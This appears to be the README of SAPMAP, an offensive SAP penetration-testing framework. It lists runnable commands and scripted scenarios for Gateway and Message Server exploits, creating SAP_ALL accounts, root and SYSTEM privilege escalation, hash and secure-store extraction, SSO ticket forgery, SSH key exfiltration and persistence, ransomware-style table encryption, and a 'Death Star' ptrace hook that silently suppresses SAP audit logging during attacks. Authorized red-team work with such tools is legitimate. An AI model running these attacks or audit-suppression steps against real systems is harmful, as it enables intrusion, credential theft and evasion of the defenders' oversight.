  # Pull mappings and plot backends on map
  - action: scc_pull_mappings
    target: "192.168.2.167"
    username: Administrator
    password: "Manage1"

  # Smoke-test every backend
  - action: scc_probe_mappings
    target: "192.168.2.167"

  # Crown jewels: backup + keystore + SSFS (requires --confirm)
  - action: scc_extract_keystore
    target: "192.168.2.167"
    username: Administrator
    password: "Manage1"
    backup_password: "Manage1"

  # Download user password hashes
  - action: scc_download_hashes
    target: "192.168.2.167"

  # Look up hashes against hashes.com rainbow tables
  - action: scc_lookup_hashes
    target: "192.168.2.167"
    api_key: "your_api_key_here"
```

#### Example: No-Creds SCC Compromise (via co-located pwned SAP node)

```yaml
name: "SCC via Pwned SAP Node"
steps:
  # Compromise the co-located SAP system first
  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  # Read SCC mappings directly from disk (no SCC admin creds needed)
  - action: harvest_scc_mappings
    target: S4H

  # Read and decrypt SSFS secrets from on-host files
  - action: harvest_scc_ssfs
    target: S4H

  # Download SCC password hashes via OS-exec
  - action: scc_download_hashes
    target: "192.168.2.209"
```

### CVE Bucket Detection

SAPMAP automatically flags SCC nodes whose version falls in a known-vulnerable range:

| CVE | Affected | Severity | Description |
|-----|---------|----------|-------------|
| CVE-2024-25642 | SCC 2.0.0 – 2.16.1 | HIGH | TLS certificate validation flaw — patched in 2.16.2 |

The bucket fires during **Pull Mappings** (authenticated version read) and produces a HIGH finding on the SCC node.

---

## Engagement Reports & Diffs

Two file-menu actions turn the live engagement state into deliverables.

### Export Engagement Report (HTML + Markdown)

`File → Export Engagement Report` writes both formats to `loot/reports/sapmap_report_<ts>.{md,html}`.

The **HTML version** is the one to hand to management:
- **Hero strip** — engagement title, generation timestamp, colour-coded `Overall risk` pill (CRITICAL when production is pwned, HIGH when any CRITICAL finding exists, MEDIUM on HIGH-only, LOW for clean, UNKNOWN on empty state). Pulsing dot anchors the eye.
- **9 KPI cards** — systems / pwned / production-pwned / critical / trust-chains-to-PRD / accounts-created / ABAP SecStore / Java SecStore / SCC count, each with a coloured left-border by severity.
- **Inline SVG landscape map** — auto-grid layout (no external image), SAP nodes colour-coded by stack (ABAP blue, Java green, ABAP+JAVA purple, HANA red, SAProuter grey), Cloud Connectors as teal hexagons, ⚡ overlay on pwned, red halo on production, curved arrows for RFC trust edges (red for SAP_ALL, dashed for untested), legend in lower-right.
- **CRITICAL + HIGH findings** as severity-bordered cards with description, detail, and a green-highlighted **Remediation** block.
- **Trust-chains table** with `CRITICAL`/`HIGH`/`MEDIUM`/`LOW` coloured pills + `PRD` badges + narrative for the top 10.
- **Landscape inventory** with PWNED + PRD badges per row, critical-count pill (red > 0, green = 0), and SCC nodes folded inline (no separate section).
- **Recovered credentials** — passwords masked, source / verified pills.
- **Recommendations** section — combines per-finding remediations with up to 10 **structural categories derived from state** (gateway ACL, MS ACL, SAProuter ACL, Java patching, default-cred rotation, SecStore rotation, SCC default creds, IR for pwned PRD, untested-RFC-to-PRD review, SCC keystore rebuild). Each carries category, scope (SIDs/hosts), title, multi-paragraph body, and SAP Note references. Cards are colour-coded by severity tier.
- `@media print` rules — prints to PDF cleanly without surprises.

### Diff Two Runs

`File → Diff Two Runs` opens a picker with every `.sapmap` file under `states/` plus a "(live, in-memory state)" option. Pick a baseline and a current snapshot, click Compare. Both Markdown and HTML diff renderings are written to `loot/reports/sapmap_diff_<ts>.{md,html}`.

The HTML diff has:
- **Hero strip** colour-banded by severity: `MAJOR REGRESSION` (newly-pwned PRD or new chains → PRD), `New exposure` (new findings without offsetting fixes), `Remediation progress` (findings removed and none added), `No major change` (identical snapshots).
- **9 signed-delta KPI cards** — newly pwned, new CRITICAL findings, new chains → PRD, findings added / remediated, nodes added / removed, trust chains added / removed.
- **Sections** for new findings, remediated findings, new vs. disappeared trust chains, added/removed/changed nodes (with before-after tables for every changed field), connection promotions to SAP_ALL, SCC changes, and SAPMAP-created-account delta.

The diff is a pure structural delta over JSON — **no live data is queried at diff time**, so it's safe to run repeatedly during and after an engagement.

---

## Evasion & Detection Avoidance (Tier 3)

Tier 3 techniques temporarily suppress SAP-native monitoring controls during an engagement window, then auto-restore the original configuration on exit.  Designed for **authorized red-team exercises** where the scope explicitly includes detection-evasion testing against SAP SOC / SIEM pipelines.

### Arming

All Tier 3 entry points are gated behind a CLI flag and a per-node baseline:

```bash
python3 sapmap.py --allow-evasion          # arm gate for the session
```

Once armed, a red **⚡ Tier 3 Armed** banner appears in the GUI.  Before any mutation can run, the operator must right-click the target node → Evasion → **Capture Evasion Baseline** to snapshot the current state (kernel params + SAL slot config + filter rows).  The baseline is saved to `loot/baseline/<SID>/baseline_<ts>.json` and serves as the restore target.

### Techniques

#### SAL Slot Disable

Right-click → Evasion → **Disable SAL Slot(s)**

Temporarily disables one or more Security Audit Log recording slots for a configurable hold window (default 60 s), then auto-restores.

**Dual-path writer:**

| Path | FM | Persistence | SM19 header changed? |
|------|-----|------------|----------------------|
| Stealth (primary) | `RSAU_UPD_AUDIT_CONFIG` | Shared memory only | No — "Last changed by" stays at previous date |
| Fallback | `RSAU_API_SET_PROFILE` | Disk + shared memory | Yes — updates "Last changed by" to SAPMAP00 |

The stealth path is attempted first.  If the legacy `RSAU_GET_AUDIT_CONFIG` / `RSAU_UPD_AUDIT_CONFIG` function modules are not available on the target kernel, the code falls back to the API path transparently.

**Slot selection:** Single slot (`1`), comma-separated (`1,2,3`), or `ALL` (flips every slot whose STATUS is currently active).

**Live countdown timer:** While slots are disabled, a pulsing activity-bar entry shows the remaining hold time (e.g. "🚨 SAL slot(s) 1,2 DISABLED — 42s").

**Connection management:** The stealth path opens/closes RFC connections per operation (read → write → sleep → restore) rather than holding a single connection open during the hold window, preventing timeouts on long holds.

#### Kernel Parameter Dynamic-Set

`tier3_set_param(state, node, param, value, ...)` — sets an SAP profile parameter at runtime via `TH_SET_PARAM` (shared memory only, no profile file change).  The original value is read first and restored automatically when the evasion window closes.

#### RSAU API Surface Probe

Right-click → Evasion → **Probe RSAU API Surface**

Discovery-only read that calls `FUNCTION_EXISTS` + `RFC_GET_FUNCTION_INTERFACE` for each FM in the `RSAU_API_*` family (`GET_AUDIT_CONFIG`, `SET_PROFILE`, `GET_PROFILE`, `SET_PARAM`, `GET_PARAM`, `UPD_AUDIT_CONFIG`).  Dumps each existing FM's IMPORT/EXPORT/TABLES signature to `loot/baseline/<SID>/rsau_api_probe_<ts>.json`.  Pure metadata — no SAL config is touched.

#### Dynamic SAL Profile Dump

Right-click → Evasion → **Dump Dynamic Profile**

Calls `RSAU_API_GET_PROFILE(ID_DYN_CONF='X')` and dumps the verbatim `ET_FILT` / `ET_FILTEX` / `ET_TEXT` / `ET_LOG` rows to `loot/baseline/<SID>/dyn_profile_<ts>.json`.  Reveals the exact 12-field RSAUPROF row shape the writer needs to construct.  Pure read — no mutation.

#### Virtual SAP Death Star (ptrace SAL suppressor)

Right-click → Evasion → **Arm Death Star** / **Disarm Death Star**

Deploys Julian Petersohn's [`sap_audit_hook`](modules/postex/vendor/sap_audit_hook.c) to `/tmp` on the target as `<sid>adm`, then PTRACE_ATTACHes to every `disp+work` worker and plants `INT3` breakpoints at the audit-writer callsites inside `rsauwr1ex` — `fwrite` for the file sink, `write_event_to_DB` (all overloads — see below) for the DB sink, `EtdSenderIsActive` + `EtdSendEvent` for SAP Enterprise Threat Detection.  Every trap dispatches to a handler that either lets the write through or (in `--suppress` mode) rewrites `RIP` past the call site with `RAX=0` — the audit event is silently dropped in-memory across all three sinks.

**Prerequisites:**
- `<sid>adm` shell access via any OS-exec channel (SAPXPG P1→P2→P3, SXPG, LPE)
- Linux `kernel.yama.ptrace_scope <= 1` (default on RHEL / SUSE / Ubuntu without hardening)
- Vendored pre-built binary (`sap_audit_hook.linux-x86_64`, 91 KB stripped, musl-static) — no compiler on the target needed

**Arm flow:** Chunked SXPG-safe base-64 upload of the 91 KB binary (~7 min on typical hosts, with elapsed / ETA / KB/s in the operator console + per-50-chunk `wc -c` size-verify) → chmod +x → SAL audit-file auto-discovery (`find /usr/sap/<SID>/*/log/*.AUD` for the `--audit-file` inotify-poison path) → `disp+work` audit-symbol diagnostic (see next) → launch detached via `setsid` with `exec >>` subshell FD redirects (works around SUSE PrivateTmp mount-namespace quirks) → pidfile-based liveness verify.

**Filter:** `filter_classes` is a comma-separated list of SAL event classes (`AUW,AU3,EUP`).  Empty string → suppress every class (default).

**Kernel 793 / S/4HANA 2023 dual-overload fix:** disp+work on kernel 793 ships **two** overloaded `write_event_to_DB` functions.  Julian's original hook resolved only the first symbol match, leaving CUZ / BU4 / AU3 / AU1 writes on the second overload completely un-hooked (SM20 kept receiving events while armed).  SAPMAP's vendored copy of the hook now walks the entire `.symtab` collecting up to 6 STT_FUNC matches for the demangled `write_event_to_DB` prefix, then plants a breakpoint at every rsauwr1ex call site targeting any overload.  Confirmed working on S4H 793 in July 2026 — SM20 clean during arm window.

**Auto symbol diagnostic:** Every arm runs a `nm -C` dump of the target's `disp+work` binary (with `readelf -s` fallback), server-side-grepped for audit-writer patterns (`write.*_to_.*DB`, `rsau_`, `AI_write`, `arch_write`, `EtdSend*`, `flush_ae`, `insert_rsauxad`), and categorises the matches in the operator log.  When a future SAP kernel renames or splits an audit-writer function, the diagnostic surfaces the new symbol name so the hook can be extended without guesswork.

**Disarm flow:** Read pidfile → SIGTERM the hook → the hook's SIGTERM handler runs `detach_all()` which restores every INT3 byte in the target `disp+work` text segment and releases ptrace.  Idempotent: safe to call when no hook is armed.

**Vendor build:** `modules/postex/vendor/build_sap_audit_hook.sh` rebuilds the binary via `musl-gcc -O2 -static` and re-runs a `--help` sanity check + strip.  Rebuild whenever `sap_audit_hook.c` changes.

### Architecture

- **`modules/postex/sapmap_evasion_baseline.py`** — Baseline snapshot capture, SAL config readers/writers (`read_legacy_sal_config`, `write_legacy_sal_config`, `capture_baseline`)
- **`modules/postex/sapmap_evasion_tier3.py`** — Technique entry points (`tier3_sal_slot_disable`, `tier3_set_param`, `probe_rsau_api_surface`, `tier3_probe_dyn_profile`, `tier3_capture_baseline_only`)
- **`modules/core/sapmap_gui.py`** — REST API routes for each technique (POST `/api/node/<sid>/tier3_sal_slot_disable`, etc.)
- **`modules/core/sapmap_html.py`** — Evasion submenu in the right-click context menu, armed-bar, countdown timer

### Restore Guarantees

Every Tier 3 mutation is wrapped in a try/finally block.  The original state (from the baseline snapshot) is replayed via the same writer FM on exit — even if the hold window is interrupted by an exception or process kill.  The stealth SAL slot writer opens a fresh RFC connection for the restore call, so a stale connection doesn't block rollback.

---

## Standalone Tools

Each standalone tool works independently with no external dependencies (Python 3 stdlib only).  After the modules reorg they live under `modules/<group>/`, but you can run them by path or import them as a module.

### sap_ms_betrusted.py — 10KBLAZE betrusted (`modules/exploitation/`)

Register a fake application server with the SAP Message Server to inject the attacker's IP into the Gateway's trusted host list:

```bash
# Check if MS internal port is unprotected (CVE-2020-6207)
python3 modules/exploitation/sap_ms_betrusted.py check-acl -t 192.168.1.100 -n 0

# Run the betrusted attack (inject attacker IP as trusted)
python3 modules/exploitation/sap_ms_betrusted.py exploit \
    -t 192.168.1.100 -p 3901 -n 0 \
    -a 192.168.2.210 \
    --dp-version 14 -v

# For older kernels (742): use dp-version 11
python3 modules/exploitation/sap_ms_betrusted.py exploit \
    -t 192.168.1.100 -p 3941 -n 40 \
    -a 192.168.2.210 \
    --dp-version 11 --old-kernel -v
```

After betrusted injects trust, use `sap_gw_xpg_standalone.py` to execute commands via the gateway. The betrusted connection must stay open while running SAPXPG (trust is revoked on disconnect).

### sap_gw_xpg_standalone.py — Gateway SAPXPG (`modules/exploitation/`)

Gateway SAPXPG command execution:

```bash
python3 modules/exploitation/sap_gw_xpg_standalone.py \
    --host 192.168.1.100 --port 3300 \
    --sid S4H --hostname s4hanadev \
    --command whoami --params "" \
    --kernel 793 -v
```

### sap_rfc_system_info.py — Unauthenticated system info (`modules/protocols/`)

Unauthenticated system info retrieval (supports SAProuter):

```bash
python3 modules/protocols/sap_rfc_system_info.py -t 192.168.1.100 -p 3300 -v
python3 modules/protocols/sap_rfc_system_info.py -t 172.31.14.107 -p 3200 -R 3.221.134.53:3299 -v
```

Extracts SID, hostname, OS, kernel version, database type, and IP addresses using four probe methods (V6 single-packet, V2 error leak, Chipik-style, DIAG login screen).

### sap_client_enum.py — DIAG client enumeration (`modules/discovery/`)

```bash
python3 modules/discovery/sap_client_enum.py -t 192.168.1.100 -p 3200
```

Discovers valid client numbers (000–999) by testing DIAG logon responses.

### sapmap_copyfail.py — CVE-2026-31431 root LPE (`modules/exploitation/`)

Programmatic check + one-shot root command execution against an authenticated SAP node (uses SAPXPG to drop the patcher and read its output back).  Validated live on SUSE Linux 6.4.0; safe pre-flight verifies the kernel range AND a working AF_ALG `authencesn` bind before doing anything destructive.  Imported from the GUI via the right-click LPE menu — the standalone module is also importable for scripted scenarios.

---

## Scripted Scenarios

SAPMAP supports automated attack scenarios via script files. The GUI opens normally and each step executes visually — you watch the attack unfold on the map in real-time.

### Usage

```bash
python3 sapmap.py --script scripts/demo_10kblaze.yaml
python3 sapmap.py --script scripts/demo_simple.json    # JSON (no PyYAML needed)
```

### Script Format (YAML)

```yaml
name: "My Attack Scenario"
description: "Optional description shown in console"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: check_gw
    target: S4H

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"
```

### Script Format (JSON)

```json
{
  "name": "My Attack Scenario",
  "steps": [
    {"action": "add_system", "sid": "S4H", "ip": "192.168.2.209", "instance": "00"},
    {"action": "check_gw", "target": "S4H"},
    {"action": "create_user", "target": "S4H", "method": "gw_exploit", "client": "001"}
  ]
}
```

### Available Actions

Actions marked **⚠** are exploitation / destructive — they only run when the CLI is invoked with `--confirm`.  Any other run logs a `[SKIP]` line for those steps so a script can safely be dry-run end-to-end (discovery + data-read) and re-run with `--confirm` when you're ready to land the exploitation stage.

#### System Management

| Action | Parameters | Description |
|--------|-----------|-------------|
| `add_system` | `sid`, `ip`, `instance`, `saprouter` (optional) | Add a system to the map |
| `set_credentials` | `target`, `username`, `password`, `client` | Store credentials for a system |
| `set_sid` | `target`, `new_sid` | Rename a node's SID and rewire every reference (connections, users, tickets, SecStore).  Use to promote placeholders like `RFCDISC_10_10_1_12` → `SJ1` once the real SID is known |
| `set_instance_nr` | `target`, `instance_nr` (2 digits) | Set the node's SAP instance NN.  Backfills conventional per-instance ports (32NN, 33NN, 36NN, 80NN) so GW / RFC / MS actions unlock without a full port scan |
| `set_type` | `target`, `system_type` | Force `node.system_type` (`ABAP` / `JAVA` / `ABAP+JAVA` / `WEB_DISPATCHER`).  `WEB_DISPATCHER` also flips `is_web_dispatcher` for ICMAD severity gating |
| `set_db_type` | `target`, `db_type` (`HDB`, `ADA`, `MSS`, `ORA`, `DB6`) | Set the backing DB — used by the GW SAPXPG SQL writer chain and RSECTAB decrypt |
| `set_os_type` | `target`, `os_type` (`Linux` / `Windows NT` / `AIX` …) | Force the OS type — controls shell wrapping in every OS-exec path |
| `set_telnet_override` | `target`, `telnet_override` (`host:port`) | Override the AS Java admin telnet (5NN08) with a tunnel endpoint.  Empty clears |
| `save_state` | `name` (optional) | Save the session to `states/<name>.sapmap` (auto-save path when name is omitted) |
| `load_state` | `name` | Load a session file from `states/<name>.sapmap` |
| `sleep` | `seconds` | Pause between steps |
| `layout` | `mode` (`grid` / `radial` / `waterfall` / …) | Rearrange nodes on the map |

#### Scanning & Detection

| Action | Parameters | Description |
|--------|-----------|-------------|
| `scan` | `targets` (CIDR / range / IP), `mode` (`fast` or `deep`), `concurrent_hosts` (default: 5) | Scan a network for SAP systems (e.g. `192.168.2.0/24`) |
| `standard_scan` | `target` | Standard-depth port + service scan on an existing node (lighter than `deep_scan`) |
| `deep_scan` | `target` | Full SAPology vulnerability scan |
| `rfc_system_info` | `target` | Unauthenticated SID probe — fills `sid` / `system_type` from V6 / V2 / Chipik responses |
| `check_gw` | `target` | Check SAP Gateway SAPXPG (10KBlaze) reachability |
| `check_ms` | `target` | Check if MS internal port is unprotected (CVE-2020-6207) |
| `check_cve_31324` | `target` | Check CVE-2025-31324 (VisualComposer JSP RCE) |
| `check_cve_6287` | `target` | Check CVE-2020-6287 (RECON) |
| `check_cve_22536` | `target` | Check CVE-2022-22536 (ICMAD HTTP-smuggle) |
| `check_default_creds` | `target` | Sequential DIAG probe of 16 vendor-default credentials across each client (sequential = lockout-safe) |
| `check_snc` | `target` | Read `snc/enable` + `snc/data_protection/*` profile params |
| `check_snc` | `target` | Read SNC configuration |
| `enum_clients` | `target` | DIAG-based enumeration of visible SAP clients |
| `client_roles` | `target` | Read T000 client roles table |
| `check_router_info` | `target` | CVE-2017-12636 / ROUTER_ADM info leak probe on a SAProuter node |
| `check_linux_lpe` (alias `check_copyfail`) | `target` | Probe Copy Fail + Dirty Frag root-LPE viability |
| `check_windows_lpe` | `target` | Probe EfsPotato / GodPotato / MiniPlasma SYSTEM-LPE viability |
| `check_all_gw` | *(none)* | Sweep GW vulnerability across every node |
| `check_all_ms` | *(none)* | Sweep MS betrusted |
| `check_all_betrusted` | `attacker_ip` (`auto` = detect) | Sweep 10KBlaze full-chain reachability |
| `check_all_cve_31324` | *(none)* | Sweep CVE-2025-31324 |
| `check_all_cve_6287` | *(none)* | Sweep CVE-2020-6287 (RECON) |
| `check_all_cve_22536` | *(none)* | Sweep ICMAD |
| `check_all_router_info` | *(none)* | Sweep CVE-2017-12636 on every SAProuter node |
| `check_all_snc` | *(none)* | Sweep SNC config |
| `check_all_vulns` | *(none)* | Meta-sweep: every vuln check across the landscape |

#### Exploitation ⚠

| Action | Parameters | Description |
|--------|-----------|-------------|
| `betrusted` | `target`, `attacker_ip` (`auto` = detect), `nilist_wait` (default: 30) | Inject attacker IP into GW trust list via MS betrusted |
| `betrusted_chain` | `target`, `attacker_ip`, `nilist_wait`, `client` | Full 10KBlaze chain: betrusted → GW exploit → create user |
| `create_user` | `target`, `method` (`gw_exploit` / `credentials`), `client` | Create a SAPMAP user with SAP_ALL on ABAP |
| `create_user_java` | `target`, `method` (`auto` / `cve_31324` / `gw` / `sapcontrol`), plus SAPControl `sapcontrol_source_sid` + `sapcontrol_dest_name` when `method=sapcontrol` | Create a SAPMAP Java UME user |
| `create_user_via_rfc` | `target` (source SID), `destination`, `target_sid` | Create a user on a remote system via a stored RFC destination |
| `exploit_cve_31324` | `target`, `command` (default `whoami`) | Run a shell command via CVE-2025-31324 JSP shell |
| `exploit_linux_lpe` (alias `exploit_copyfail`) | `target`, `command` (default `id`) | Run a command as root via the best viable Linux LPE (Copy Fail → Dirty Frag) |
| `exploit_windows_lpe` | `target`, `command` (default `whoami`), `av_evasion` | Run a command as `NT AUTHORITY\SYSTEM` via the best viable Windows LPE |
| `lpe` | `target`, `method` (optional) | ABAP LPE — assign SAP_ALL to the current user (SXPG / WebGUI RSBDCOS0 / BAPI) |
| `ransapware_encrypt` ⚠ | `target`, `table`, `max_rows` (5000), `send_popup` (true) | Encrypt character fields in an SAP table (RanSAPware Awareness PoC) |
| `ransapware_decrypt` | `target`, `manifest_path` | Decrypt a previously encrypted table using its manifest |
| `icmad_acl_bypass` | `target`, `outer_path` | ICMAD D.2 — sweep 12 admin/recon paths through the smuggle bypass (requires `check_cve_22536` first) |
| `icmad_heapdump_pull` | `target`, `dump` (empty = list) | ICMAD D.3 — list or pull HPROF heap dumps via the ACL bypass |

#### AutoPwn — Full-Landscape Convergence Loop ⚠

| Action | Parameters | Description |
|--------|-----------|-------------|
| `autopwn` | `max_waves` (5), `include_lpe` (false), `include_btp` (true), `scan_gw` (true), `scan_10kblaze` (false), `scan_cve_31324` (true), `scan_recon` (true), `include_icmad_detection` (true), `include_router_info_detection` (true) | Launch the full scan → exploit → enrich → propagate loop.  Includes the SAPControl OSExecute Type-G path — a source ABAP's `to_<target>` destination + `<sid>adm` creds unlocks OS-shell on firewalled Java stacks |
| `propagate` | `target` | Exploit RFC connections from one pwned node |
| `propagate_all` | *(none)* | Retrieve RFCs + propagate from every pwned node |

#### Data Extraction

| Action | Parameters | Description |
|--------|-----------|-------------|
| `retrieve_rfcs` | `target` | Retrieve every RFC destination from the system.  For Type-G / SAPControl destinations this also caches the OSExecute pivot on the target when creds are already available |
| `test_rfcs` | `target` | Test/ping every discovered RFC destination.  Triggers the SAPControl auth probe on Type-G endpoints |
| `test_rfc_single` | `target`, `destination` | Test one specific destination.  Same SAPControl-probe hook as `test_rfcs` for Type-G |
| `download_hashes` | `target` | Extract USR02 password hashes (BCODE/PASSCODE) |
| `download_secstore` | `target` | Decrypt ABAP SecStore (RSECTAB) — RFC/DB/CTS/SMTP passwords |
| `download_table` | `target`, `table`, `fields`, `where`, `max_rows` (500) | Generic `RFC_READ_TABLE` — routes over SOAP-RFC when the gateway is firewalled |
| `read_usrextid` | `target` | Read USREXTID (cert-CN → ABAP user mappings) |
| `read_oa2c` | `target` | Read OA2C_CLIENT + OA2C_CLIENT_EXT — OAuth2 profiles for BTP token minting |
| `create_tcpip_dest` | `target`, `destination`, `host`, `program` | Create a TCP/IP RFC destination on a pwned ABAP node |
| `verify_pp_impersonation` | `target` | Verify that a SCC subject-pattern rule opens a session as the impersonation-target ABAP user |
| `import_transport` ⚠ | `target`, `target_client` (`001`), `dry_run` (true), `channel` (`auto` / `gw` / `sxpg`) | STMS transport dry-run against a previously-uploaded transport (full upload uses the GUI's Import Transport menu) |
| `cleanup` | `target` | Delete every SAPMAP-created user on this node |
| `cleanup_all` | *(none)* | Delete SAPMAP-created users on every node |

#### OS Execution

| Action | Parameters | Description |
|--------|-----------|-------------|
| `exec_command` | `target`, `method` (`gateway` / `sxpg` / `cve_31324` / `sapcontrol`), `cmdline` | Run a shell command via the picked OS-exec channel.  `cmdline` auto-wraps in the target OS's shell |
| `sapcontrol_osexecute` | `target`, `destination_name`, `command`, `timeout` (30) | Run a command via SAPControl OSExecute directly.  Requires `os_exec_verified` on the connection — run `test_rfc_single` first |

#### Java Data Extraction / Impact

| Action | Parameters | Description |
|--------|-----------|-------------|
| `java_secstore` | `target` | Extract + decrypt the Java Secure Store on-server via dropped JSP |
| `extract_java_hashes` | `target` | Extract UME password hashes + `J2EE_CONFIGENTRY` credential entries |
| `read_java_destinations` | `target` | Read all JCo destinations from `J2EE_CONFIGENTRY`, plot downstream targets, import credentials |
| `download_java_table` | `target`, `table`, `fields` (`*`), `where`, `max_rows` (500) | Run a SELECT against the Java stack's DB via JSP/JDBC |
| `impact_assess_java` | `target` | Run Java business-impact scenarios (PI/PO, NWDI/CTS+, HR/ESS, KMC, audit tamper) |

**Macro** `java_pipeline` — one-line convenience that expands to `check_cve_31324` → `java_secstore` → `extract_java_hashes` → `read_java_destinations` → `impact_assess_java`.

#### MYSAPSSO2 Ticket Forgery ⚠

| Action | Parameters | Description |
|--------|-----------|-------------|
| `discover_strustsso2` | `target` | Populate `state.trust_relations` from USREXTID / USRACL / STRUSTSSO2 |
| `forge_ticket` | `target`, `user` (`SAP*`), `client` (`100`), `validity_min` (120), `digest` (`sha256`), `pin` (optional), `recipient_sid` (optional), `recipient_client` (optional) | Forge a MYSAPSSO2 logon ticket signed by the target's SAPSYS.pse |
| `propagate_ticket` | `target`, `ticket_index` (0), `target_sids` (list), `channels` (`http`/`rfc`), `timeout` (10) | Replay a forged ticket against one or more receivers |
| `forge_and_fanout` | `target`, `user`, `client`, `validity_min`, `digest`, `channels`, `timeout` | Forge + auto-replay against every trusted receiver in `state.trust_relations` |

#### SSH Lateral Movement

| Action | Parameters | Description |
|--------|-----------|-------------|
| `ssh_harvest` | `target`, `channel` (`auto`) | Enumerate OS users, exfiltrate SSH keys, parse `known_hosts` + `authorized_keys` + `config` |
| `ssh_test_keys` | `target`, `channel`, `keys`, `os_users` (all optional) | Test harvested keys against known targets — falls back to `loot/ssh/<host>/harvest.json` |
| `ssh_plant_key` ⚠ | `target`, `channel`, `target_user` | Plant the SAPMAP SSH pubkey for persistence |

#### SAP Cloud Connector (SCC)

Cloud Connector actions come in two flavours — `scc_*` operate against an SCC host directly, `harvest_scc*` run through OS-exec on a co-located pwned SAP node.

| Action | Parameters | Description |
|--------|-----------|-------------|
| `scc_set_credentials` | `target` (SCC host), `username`, `password` | Store SCC admin credentials |
| `scc_probe_creds` | `target` | Probe SCC default credentials |
| `scc_pull_mappings` | `target`, `username`, `password` | Pull cloud→on-prem mappings via SCC admin REST API |
| `scc_probe_mappings` | `target` | TCP/HTTP smoke-test every SCC mapping |
| `scc_extract_keystore` ⚠ | `target`, `username`, `password`, `backup_password` | Pull backup, extract keystores, decrypt SSFS |
| `scc_download_hashes` | `target` | Download SCC user hashes (`users.xml`) via OS-exec / zip / REST |
| `scc_lookup_hashes` | `target`, `api_key` (optional), `hashes` (optional) | Look up SCC hashes against hashes.com rainbow tables |
| `scc_decrypt_ssfs` | `target` | Decrypt SSFS_SCC blob from a previously extracted backup |
| `harvest_scc` ⚠ | `target` (SAP node SID) | Post-RCE SCC harvest (ARP sweep, keystore bundle exfil, …) |
| `harvest_scc_mappings` | `target` (SAP node SID) | Read `backends.xml` via OS-exec on a co-located SAP node |
| `harvest_scc_ssfs` | `target` (SAP node SID) | Read on-host SSFS_SCC.KEY/.DAT via OS-exec, decrypt secrets |
| `harvest_scc_hashes_via_lpe` | `target` (SAP node SID) | LPE-elevated harvest of `users.xml` (requires root LPE on a co-located node) |

#### SAProuter

| Action | Parameters | Description |
|--------|-----------|-------------|
| `set_saprouter` | `target`, `saprouter` (`/H/host/S/3299`) | Attach a SAProuter prefix so subsequent ops tunnel through it |
| `check_router_info` | `target` | CVE-2017-12636 / ROUTER_ADM info leak probe |
| `router_scan` | `target`, `targets`, `auto_targets`, `inst_from`, `inst_to`, `mode` (`sap` / `full`), `concurrency`, `timeout` | Scan internal hosts through a SAProuter node |

#### Web Dispatcher / ICM Admin

| Action | Parameters | Description |
|--------|-----------|-------------|
| `wd_rediscover` | `target` | Rescan a WD / ICM node for admin ports and backend routes |
| `wd_admin_set_credentials` | `target`, `username`, `password` | Store admin credentials for the ICM/WD admin UI |
| `wd_admin_probe_defaults` | `target` | Probe default credentials against the ICM/WD admin UI |
| `wd_extract_icmauth` | `target` | Pull `icmauth.txt` (hashed webadmin credentials) via admin API |

#### Landscape Analysis

| Action | Parameters | Description |
|--------|-----------|-------------|
| `impact_assess` | `target`, `client`, `scenario` (optional) | Business impact assessment |
| `impact_show` | `target` | Print impact results to the console |
| `impact_export` | `target`, `scenario` (optional) | Export impact data to CSV in `loot/bia/` |
| `analyze_chains` | *(none)* | Discover RFC trust-chain escalation paths |
| `highlight_chain` | `start` + `end` (SIDs), or `index` (0-based) | Highlight an attack chain on the map |
| `analyse_capabilities` | `target` | MITRE ATT&CK-style capability analysis on a pwned node |

#### BTP — Cloud-Side (with a stored token)

| Action | Parameters | Description |
|--------|-----------|-------------|
| `btp_set_token` | `region` (optional — auto-derived from token's `iss` claim), `token` (JWT, or `path:<file>` to load from disk) | Store a BTP access token in process memory for later enumerate / pull-destinations calls |
| `btp_enumerate` | `region` | Kind-aware enumeration over the stored token (CF API for `cf` tokens; subaccount + SCC mappings for `subaccount` tokens; bound subaccount surface for `destination` tokens) |
| `btp_pull_destinations_for_token` | `region` | For a destination-service-scoped token, pull every destination on the bound subaccount, capture cleartext where `ApiAccess` is granted, link to on-prem SAPNodes and auto-Standard-Scan any new placeholder |
| `btp_test_destination` | `source_sid` (`BTP:<uuid8>`), `destination_name` | Test a synthetic BTP→on-prem edge — HTTP basic-auth probe + ABAP RFC profile fetch incl. SAP_ALL when target is ABAP |
| `btp_create_user_on_target` | `source_sid`, `destination_name`, `target_sid` | After a successful test that flips `has_sap_all`, mint a SAPMAP user on the target ABAP via the captured creds |

#### BTP — On-Prem → Cloud Lateral Pivot

| Action | Parameters | Description |
|--------|-----------|-------------|
| `harvest_btp_creds` | `target` (must be ABAP for OA2C refresh) | Refresh `OA2C_CLIENT[+_EXT]` and scan SM59 destinations + ABAP RSECTAB + Java SecStoreFS + OA2C profiles for BTP-shaped credentials.  Returns candidates ready to mint |
| `mint_btp_token` | `target` (source node SID), `uaa_url`, `client_id`, `client_secret` (or `path:<file>`) | Exchange `(client_id, client_secret)` at XSUAA's `/oauth/token` for a BTP access token, store keyed by region (auto-derived from `iss` claim).  Auto-fires the cloud-side enumeration on completion |

#### Tier 3 Evasion — Virtual SAP Death Star ⚠

Requires the SAPMAP session to have been started with `--allow-evasion`.  Both endpoints refuse otherwise.  See [Virtual SAP Death Star](#virtual-sap-death-star-ptrace-sal-suppressor) for the technique itself.

| Action | Parameters | Description |
|--------|-----------|-------------|
| `tier3_arm_death_star` ⚠ | `target`, `filter_classes` (default `""` = all classes), `target_pid` (default auto), `skip_upload` (false), `skip_compile` (false), `verbose` (true) | Deploy Julian's `sap_audit_hook` on the target and ptrace-attach to every `disp+work` worker.  SAL events matching `filter_classes` are silently dropped across `fwrite` / `write_event_to_DB` (all overloads) / `EtdSendEvent`.  Bracket noisy exploit blocks between this and the disarm step — SM20 stays clean during the armed window |
| `tier3_disarm_death_star` | `target` | SIGTERM the hook.  The hook's handler restores every INT3 byte in `disp+work` text and releases ptrace.  Idempotent — safe to call when nothing is armed |

**Typical wrap pattern:**

```yaml
- action: tier3_arm_death_star
  target: S4H
  # filter_classes: AUW,AU3   # optional — omit to suppress every SAL class
  timeout: 900                # first arm on a new host takes ~7 min (chunked binary upload)

# ... noisy exploit steps (create_user, download_secstore, propagate, …) ...

- action: tier3_disarm_death_star
  target: S4H
```

